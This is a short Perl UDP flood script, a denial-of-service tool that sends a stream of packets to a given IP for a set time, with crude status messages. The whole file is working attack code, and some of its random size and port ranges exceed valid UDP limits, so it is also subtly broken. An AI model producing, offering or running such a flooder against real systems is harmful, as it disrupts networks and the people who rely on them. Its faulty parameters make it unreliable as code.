#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
$Term::ANSIColor::AUTORESET = 2;
use Socket;
use strict;

my ($ip, $port, $size, $time) = @ARGV;

my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor qw(:constants);
$Term::ANSIColor::AUTORESET = 2;
print "~ balls~ $ip " . ($port ? $port : "random") . "-" . ($size ? "$size-byte" : "bu.. but the.. balls!") . "
~ Pissing on $ip.
~ #Balls ~ " . ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

my $packet_count = 0;
while (time() <= $endtime) {
  $psize = $size ? $size : int(rand(1500000 - 64) + 64);
  $pport = $port ? $port : int(rand(1500000)) + 1;

  send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
  $packet_count++;
}
print "owo $packet_count cums\n";
